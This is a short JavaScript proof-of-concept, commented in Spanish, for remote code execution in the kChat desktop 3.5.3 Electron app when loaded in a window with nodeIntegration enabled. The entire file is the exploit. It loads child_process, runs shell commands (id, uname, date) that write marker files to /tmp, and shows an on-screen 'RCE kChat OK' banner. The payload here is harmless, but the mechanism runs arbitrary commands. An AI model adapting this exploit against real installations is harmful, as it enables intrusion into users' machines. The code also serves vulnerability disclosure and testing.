/* PoC kChat desktop 3.5.3 - carga en ventana con nodeIntegration */
try {
  var cp = require('electron').ipcRenderer ? require('child_process') : require('child_process');
  cp.exec('id > /tmp/KCHAT_RCE.txt; uname -a >> /tmp/KCHAT_RCE.txt; date >> /tmp/KCHAT_RCE.txt; touch /tmp/KCHAT_RCE_OK', function (e, so, se) {
    var d = document.createElement('div');
    d.style.cssText = 'position:fixed;z-index:99999;left:8px;bottom:8px;background:#111;color:#0f0;font:12px monospace;padding:8px;border:1px solid #0f0';
    d.textContent = 'RCE kChat OK: ' + (so || se || e);
    document.documentElement.appendChild(d);
  });
} catch (err) {
  document.title = 'RCE-ERR ' + err.message;
}
